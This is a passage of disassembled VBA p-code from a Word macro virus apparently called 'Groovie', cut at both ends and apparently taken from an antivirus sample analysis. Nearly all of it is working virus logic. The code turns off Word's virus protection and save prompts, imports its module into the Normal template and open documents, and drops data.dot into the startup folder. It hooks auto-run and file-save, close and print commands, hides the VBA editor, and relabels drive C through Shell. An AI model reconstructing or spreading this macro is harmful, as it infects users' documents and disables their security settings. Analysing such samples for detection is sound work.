' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #106:
' 	LitStr 0x0010 "label c: groovie"
' 	Paren 
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #107:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #108:
' 	LitDI2 0x0001 
' 	ArgsLd Windows 0x0001 
' 	ArgsMemCall Close 0x0000 
' Line #109:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #110:
' 	EndIfBlock 
' Line #111:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #112:
' 	EndFunc 
' Line #113:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #114:
' 	FuncDefn (Function I13())
' Line #115:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #116:
' 	OnError (Resume Next) 
' Line #117:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #118:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #119:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #120:
' 	ArgsCall (Call) I17 0x0000 
' Line #121:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #122:
' 	Ld I04 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld I07 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #123:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #124:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	With 
' Line #125:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #126:
' 	StartWithExpr 
' 	LitStr 0x000E "c:\groovie.sys"
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #127:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #128:
' 	EndWith 
' Line #129:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #130:
' 	EndWith 
' Line #131:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #132:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #133:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #134:
' 	LitStr 0x001A "ALT-F11 says it's groovie!"
' 	MemStWith Comments 
' Line #135:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #136:
' 	ArgsMemCallWith Execute 0x0000 
' Line #137:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #138:
' 	EndWith 
' Line #139:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #140:
' 	EndIfBlock 
' Line #141:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #142:
' 	Ld I02 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld I07 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #143:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #144:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0009 "\data.dot"
' 	Add 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #145:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #146:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0009 "\data.dot"
' 	Add 
' 	ParamNamed Source 
' 	LitStr 0x0007 "groovie"
' 	ParamNamed New 
' 	LitStr 0x0005 "orbit"
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #147:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #148:
' 	Ld I08 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld I06 
' 	ParamNamed FileName 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0001 
' 	EndIf 
' Line #149:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #150:
' 	Ld wdSaveChanges 
' 	ParamNamed SaveChanges 
' 	LitDI2 0x0001 
' 	ArgsLd Windows 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #151:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #152:
' 	EndIfBlock 
' Line #153:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #154:
' 	Ld I02 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld I07 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #155:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #156:
' 	LitStr 0x0000 ""
' 	ParamNamed Template 
' 	LitVarSpecial (False)
' 	ParamNamed NewTemplate 
' 	Ld Documents 
' 	ArgsMemCall Add 0x0002 
' Line #157:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #158:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0009 "\data.dot"
' 	Add 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #159:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #160:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0009 "\data.dot"
' 	Add 
' 	ParamNamed Source 
' 	LitStr 0x0007 "groovie"
' 	ParamNamed New 
' 	LitStr 0x0005 "orbit"
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #161:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #162:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #163:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #164:
' 	Ld wdSaveChanges 
' 	ParamNamed SaveChanges 
' 	LitDI2 0x0001 
' 	ArgsLd Windows 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #165:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #166:
' 	EndIfBlock 
' Line #167:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #168:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #169:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #170:
' 	EndFunc 
' Line #171:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #172:
' 	FuncDefn (Function I14())
' Line #173:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #174:
' 	OnError (Resume Next) 
' Line #175:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #176:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #177:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #178:
' 	Ld I03 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld I05 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #179:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #180:
' 	StartWithExpr 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	With 
' Line #181:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #182:
' 	StartWithExpr 
' 	LitStr 0x000E "c:\groovie.sys"
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #183:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #184:
' 	EndWith 
' Line #185:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #186:
' 	EndWith 
' Line #187:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #188:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #189:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #190:
' 	EndIfBlock 
' Line #191:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #192:
' 	Ld I04 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #193:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #194:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	With 
' Line #195:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #196:
' 	StartWithExpr 
' 	LitStr 0x000E "c:\groovie.sys"
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #197:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #198:
' 	EndWith 
' Line #199:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #200:
' 	EndWith 
' Line #201:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #202:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #203:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #204:
' 	LitStr 0x001A "ALT-F11 says it's groovie!"
' 	MemStWith Comments 
' Line #205:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #206:
' 	ArgsMemCallWith Execute 0x0000 
' Line #207:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #208:
' 	EndWith 
' Line #209:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #210:
' 	EndIfBlock 
' Line #211:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #212:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #213:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #214:
' 	EndFunc 
' Line #215:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #216:
' 	FuncDefn (Function I15())
' Line #217:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #218:
' 	OnError (Resume Next) 
' Line #219:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #220:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #221:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #222:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #223:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #224:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #225:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #226:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St I06 
' Line #227:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #228:
' 	ArgsCall (Call) I11 0x0000 
' Line #229:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #230:
' 	EndFunc 
' Line #231:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #232:
' 	FuncDefn (Sub AutoOpen())
' Line #233:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #234:
' 	OnError (Resume Next) 
' Line #235:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #236:
' 	ArgsCall (Call) I15 0x0000 
' Line #237:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #238:
' 	EndSub 
' Line #239:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #240:
' 	FuncDefn (Sub AutoClose())
' Line #241:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #242:
' 	OnError (Resume Next) 
' Line #243:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #244:
' 	LitVarSpecial (True)
' 	St I08 
' Line #245:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #246:
' 	ArgsCall (Call) I15 0x0000 
' Line #247:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #248:
' 	EndSub 
' Line #249:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #250:
' 	FuncDefn (Sub AutoExit())
' Line #251:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #252:
' 	OnError (Resume Next) 
' Line #253:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #254:
' 	ArgsCall (Call) I15 0x0000 
' Line #255:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #256:
' 	EndSub 
' Line #257:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #258:
' 	FuncDefn (Sub FileSaveAs())
' Line #259:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #260:
' 	OnError (Resume Next) 
' Line #261:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #262:
' 	ArgsCall (Call) I16 0x0000 
' Line #263:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #264:
' 	ArgsCall (Call) I15 0x0000 
' Line #265:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #266:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #267:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #268:
' 	EndSub 
' Line #269:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #270:
' 	FuncDefn (Sub filesave())
' Line #271:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #272:
' 	OnError (Resume Next) 
' Line #273:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #274:
' 	ArgsCall (Call) I16 0x0000 
' Line #275:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #276:
' 	ArgsCall (Call) I15 0x0000 
' Line #277:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #278:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #279:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #280:
' 	EndSub 
' Line #281:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #282:
' 	FuncDefn (Sub fileclose())
' Line #283:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #284:
' 	OnError (Resume Next) 
' Line #285:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #286:
' 	LitVarSpecial (True)
' 	St I08 
' Line #287:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #288:
' 	ArgsCall (Call) I15 0x0000 
' Line #289:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #290:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #291:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #292:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #293:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #294:
' 	EndSub 
' Line #295:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #296:
' 	FuncDefn (Sub fileprint())
' Line #297:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #298:
' 	OnError (Resume Next) 
' Line #299:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #300:
' 	ArgsCall (Call) I15 0x0000 
' Line #301:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #302:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #303:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #304:
' 	EndSub 
' Line #305:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #306:
' 	FuncDefn (Sub ViewVBCode())
' Line #307:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #308:
' 	LitStr 0x000C "It's GROOVIE"
' 	Ld vbOKOnly 
' 	LitStr 0x0015 "•  ALT-F11  • says..."
' 	ArgsCall MsgBox 0x0003 
' Line #309:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #310:
' 	EndSub 
' Line #311:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #312:
' 	FuncDefn (Sub FileTemplates())
' Line #313:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #314:
' 	EndSub 
' Line #315:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #316:
' 	FuncDefn (Function I17())
' Line #317:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #318:
' 	OnError docek 
' Line #319:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #320:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #321:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #322:
' 	LitVarSpecial (True)
' 	St I07 
' Line #323:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #324:
' 	EndIfBlock 
' Line #325:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #326:
' 	GoTo over 
' Line #327:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #328:
' 	Label docek 
' Line #329:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #330:
' 	LitVarSpecial (False)
' 	St I07 
' Line #331:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #332:
' 	Label over 
' Line #333:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #334:
' 	EndFunc 
' Line #335:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #336:
' 	FuncDefn (Function I16())
' Line #337:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #338:
' 	ArgsCall Read 0x0000 
' Line #339:
